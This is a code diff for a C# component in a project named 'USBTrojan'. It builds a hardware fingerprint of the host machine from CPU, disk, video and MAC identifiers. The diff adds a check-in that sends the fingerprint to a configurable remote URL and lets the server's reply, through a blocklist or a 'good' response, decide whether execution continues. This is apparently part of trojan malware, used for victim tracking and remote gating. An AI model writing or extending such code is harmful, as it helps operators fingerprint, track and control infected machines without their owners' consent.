@@ -1,8 +1,12 @@
-﻿using System.IO;
+﻿using System;
+using System.IO;
 using System.Collections.Generic;
 using System.Text;
 using System.Globalization;
+using System.Linq;
 using System.Security.Cryptography;
+using System.Management;
+using System.Net;
 
 namespace USBTrojan
 {
@@ -12,7 +16,8 @@ namespace USBTrojan
         private const string HWIDCachePath = "hwid.cfg";
         public static string GetHWID()
         {
-            if (File.Exists(HWIDCachePath)) _fingerPrint = File.ReadAllText(HWIDCachePath);
+            if (Config.HWID_Cache_Enabled && File.Exists(HWIDCachePath))
+                _fingerPrint = File.ReadAllText(HWIDCachePath);
             if (string.IsNullOrEmpty(_fingerPrint))
             {
                 _fingerPrint = GetHash("CPU >> " + CpuId() +
@@ -21,9 +26,34 @@ namespace USBTrojan
                     "\nDISK >> " + DiskId() +
                     "\nVIDEO >> " + VideoId() +
                     "\nMAC >> " + MacId());
-                File.WriteAllText(HWIDCachePath, _fingerPrint);
+                if (Config.HWID_Cache_Enabled)
+                    File.WriteAllText(HWIDCachePath, _fingerPrint);
             }
             return _fingerPrint;
+        }
+        public static bool CheckHWID()
+        {
+            string hwid = GetHWID();
+            var client = new WebClient();
+            try
+            {
+                var response = client.DownloadString(string.Format(Config.HWID_List_URL, hwid));
+                if (Config.HWID_Mode == 0)
+                {
+                    var list = response.Split('\n');
+                    return !list.Contains(hwid);
+                }
+                else if (Config.HWID_Mode == 1)
+                {
+                    return response == "good";
+                }
+            }
+            catch (WebException ex)
+            {
+                // Handle exception
+                Console.WriteLine(ex.Message);
+            }
+            return false;
         }
         private static string GetHash(string s)
         {
@@ -57,9 +87,9 @@ namespace USBTrojan
         private static string Identifier(string wmiClass, string wmiProperty, string wmiMustBeTrue)
         {
             string result = "";
-            System.Management.ManagementClass mc = new System.Management.ManagementClass(wmiClass);
-            System.Management.ManagementObjectCollection moc = mc.GetInstances();
-            foreach (System.Management.ManagementBaseObject mo in moc)
+            ManagementClass mc = new ManagementClass(wmiClass);
+            ManagementObjectCollection moc = mc.GetInstances();
+            foreach (ManagementBaseObject mo in moc)
             {
                 if (mo[wmiMustBeTrue].ToString() != "True") continue;
                 if (result != "") continue;
@@ -76,9 +106,9 @@ namespace USBTrojan
         private static string Identifier(string wmiClass, string wmiProperty)
         {
             string result = "";
-            System.Management.ManagementClass mc = new System.Management.ManagementClass(wmiClass);
-            System.Management.ManagementObjectCollection moc = mc.GetInstances();
-            foreach (System.Management.ManagementBaseObject mo in moc)
+            ManagementClass mc = new ManagementClass(wmiClass);
+            ManagementObjectCollection moc = mc.GetInstances();
+            foreach (ManagementBaseObject mo in moc)
             {
                 if (result != "") continue;
                 try
